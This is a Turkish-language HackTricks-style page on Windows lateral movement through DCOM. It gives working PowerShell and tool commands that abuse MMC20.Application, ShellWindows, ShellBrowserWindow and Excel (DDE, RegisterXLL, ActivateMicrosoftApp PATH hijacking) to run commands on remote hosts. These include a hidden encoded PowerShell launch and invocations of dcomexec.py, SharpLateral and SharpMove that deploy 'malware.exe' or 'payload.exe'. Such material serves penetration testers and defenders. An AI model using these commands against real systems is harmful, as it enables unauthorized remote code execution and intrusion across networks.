# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement, bir servis veya scheduled task oluşturmaya gerek kalmadan RPC/DCOM üzerinden açığa çıkarılan mevcut COM sunucularını yeniden kullandığı için caziptir. Pratikte bu, ilk bağlantının genellikle TCP/135 üzerinden başlatıldığı ve ardından dinamik olarak atanan yüksek RPC portlarına geçtiği anlamına gelir.

## Gereksinimler ve Dikkat Edilmesi Gerekenler

- Genellikle hedef üzerinde local administrator context gerekir ve uzak COM sunucusu remote launch/activation işlemlerine izin vermelidir.
- **14 Mart 2023** tarihinden bu yana Microsoft, desteklenen sistemlerde DCOM hardening uygular. Düşük bir activation authentication level talep eden eski client'lar, en az `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` seviyesini negotiate edemedikleri takdirde başarısız olabilir. Modern Windows client'ları genellikle otomatik olarak daha yüksek seviyeye çıkarılır; bu nedenle güncel tooling normalde çalışmaya devam eder.<sup>[[3]](#references)</sup>
- Manual veya scripted DCOM execution genellikle TCP/135'in yanı sıra hedefin dynamic RPC port range'ine erişim gerektirir. Impacket'ın `dcomexec.py` aracını kullanıyorsanız ve command output almak istiyorsanız genellikle `ADMIN$` (veya yazılabilir/okunabilir başka bir share) üzerinde SMB erişimine de ihtiyacınız olur.
- RPC/DCOM çalışıyor ancak SMB engelleniyorsa `dcomexec.py -nooutput`, blind execution için yine de faydalı olabilir.

Hızlı kontroller:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Bu teknik hakkında daha fazla bilgi için [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) adresindeki orijinal gönderiye bakın.**<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) nesneleri, ağ tabanlı nesne etkileşimleri için ilgi çekici bir yetenek sunar. Microsoft, hem DCOM hem de Component Object Model (COM) için kapsamlı belgeler sağlar; bunlara [here for DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve [here for COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) adreslerinden erişilebilir. PowerShell komutu kullanılarak DCOM uygulamalarının bir listesi alınabilir:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in işlemlerinin script ile çalıştırılmasını sağlar. Özellikle bu object, `Document.ActiveView` altında bir `ExecuteShellCommand` methodu içerir. Bu method hakkında daha fazla bilgiye [buradan](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) ulaşabilirsiniz. Aşağıdaki şekilde çalıştırarak kontrol edin:<sup>[[6]](#references)</sup>

Bu özellik, bir DCOM application aracılığıyla network üzerinden command çalıştırılmasını kolaylaştırır. DCOM ile uzaktan admin olarak etkileşim kurmak için PowerShell şu şekilde kullanılabilir:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Bu komut DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. Ardından uzak ana bilgisayarda bir işlemi yürütmek için ExecuteShellCommand metodu çağrılabilir. İşlem aşağıdaki adımları içerir:

Metotları kontrol edin:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE Al:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Son argüman pencere stilidir. `7`, pencereyi simge durumunda tutar. Operasyonel olarak MMC tabanlı execution, genellikle uzak sistemdeki bir `mmc.exe` process'inin payload'unuzu spawn etmesine yol açar; bu, aşağıdaki Explorer destekli object'lerden farklıdır.

## ShellWindows & ShellBrowserWindow

**Bu technique hakkında daha fazla bilgi için original post'a bakın: [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** object'inin açık "LaunchPermissions" değerine sahip olmadığı ve Administrators erişimine izin veren permission'lara varsayılan olarak başvurduğu tespit edilmiştir. Daha fazla ayrıntı için [buradaki](https://twitter.com/tiraniddo/status/817532039771525120) thread incelenebilir. Açık Launch Permission değerine sahip olmayan object'leri filtrelemek için [@tiraniddo](https://twitter.com/tiraniddo)’nun OleView .NET aracının kullanılması önerilir.

İki özel object, açık Launch Permissions değerlerine sahip olmamaları nedeniyle öne çıkarılmıştır: `ShellBrowserWindow` ve `ShellWindows`. `HKCR:\AppID\{guid}` altında bir `LaunchPermission` registry entry'sinin bulunmaması, açık permission tanımlanmadığı anlamına gelir.

`MMC20.Application` ile karşılaştırıldığında bu object'ler, OPSEC açısından genellikle daha sessizdir; çünkü command, uzak host'ta `mmc.exe` yerine çoğunlukla `explorer.exe` process'inin child process'i olarak çalışır.

### ShellWindows

ProgID değerine sahip olmayan `ShellWindows` için .NET method'ları `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID kullanılarak object instance'ı oluşturulmasını sağlar. Bu işlem, `ShellWindows` için CLSID değerini almak üzere OleView .NET'ten yararlanır. Instance oluşturulduktan sonra `WindowsShell.Item` method'u üzerinden interaction sağlanabilir ve `Document.Application.ShellExecute` gibi method invocation'larına yol açar.

Object'i instantiate etmek ve command'leri remotely execute etmek için örnek PowerShell command'leri verilmiştir:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` benzerdir, ancak onu doğrudan CLSID'si üzerinden örnekleyebilir ve `Document.Application.ShellExecute` yöntemine pivot edebilirsiniz:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects ile Lateral Movement

Lateral movement, DCOM Excel objects istismar edilerek gerçekleştirilebilir. Ayrıntılı bilgi için, DCOM üzerinden lateral movement amacıyla Excel DDE kullanımını ele alan [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) yazısının okunması önerilir.<sup>[[5]](#references)</sup>

Empire project, DCOM objects manipüle ederek remote code execution (RCE) için Excel kullanımını gösteren bir PowerShell scripti sağlar. Aşağıda, Excel'i RCE amacıyla abuse etmek için farklı yöntemleri gösteren ve [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) üzerinde bulunan script'ten alınmış snippet'ler yer almaktadır:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Son araştırmalar, bu alanı `Excel.Application`'ın `ActivateMicrosoftApp()` yöntemiyle genişletti. Temel fikir, Excel'in sistem `PATH`'ini arayarak FoxPro, Schedule Plus veya Project gibi eski Microsoft uygulamalarını başlatmayı denemesidir. Bir operatör, bu beklenen adlardan birine sahip payload'ı hedefin `PATH`'inde yer alan yazılabilir bir konuma yerleştirebilirse Excel bunu çalıştırır.<sup>[[4]](#references)</sup>

Bu varyasyon için gereksinimler:

- Hedefte local admin yetkisi
- Hedefte Excel'in kurulu olması
- Hedefin `PATH`'inde bulunan yazılabilir bir dizine payload yazabilme yeteneği

FoxPro lookup'ını (`FOXPROW.exe`) abuse eden pratik örnek:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Saldırı yapan host'ta yerel `Excel.Application` ProgID'si kayıtlı değilse, bunun yerine uzak nesneyi CLSID ile örneklendirin:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Pratikte kötüye kullanıldığı görülen değerler:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement için Automation Tools

Bu teknikleri otomatikleştirmek için iki araç öne çıkmaktadır:

- **Invoke-DCOM.ps1**: Empire projesi tarafından sağlanan ve uzak makinelerde kod çalıştırmak için farklı yöntemlerin kullanılmasını kolaylaştıran bir PowerShell scriptidir. Bu script, Empire GitHub repository'sinde erişilebilir durumdadır.

- **SharpLateral**: Uzak kod çalıştırmak için tasarlanmış bir araçtır ve şu komutla kullanılabilir:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Otomatik Araçlar

- [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) Powershell script'i, diğer makinelerde kod yürütmek için yorum satırlarıyla belirtilen tüm yöntemleri kolayca çağırmanıza olanak tanır.
- DCOM kullanarak uzak sistemlerde komut yürütmek için Impacket'ın `dcomexec.py` aracını kullanabilirsiniz. Güncel sürümler `ShellWindows`, `ShellBrowserWindow` ve `MMC20` desteğine sahiptir ve varsayılan olarak `ShellWindows` kullanır.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Ayrıca [**SharpLateral**](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Ayrıca [**SharpMove**](https://github.com/0xthirteen/SharpMove) kullanabilirsiniz
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Referanslar

- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass (CVE-2021-26414) değişikliklerini yönetme](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application'ın gücünü kötüye kullanma](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM üzerinden lateral movement için Excel DDE'den yararlanma](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)

{{#include ../../banners/hacktricks-training.md}}
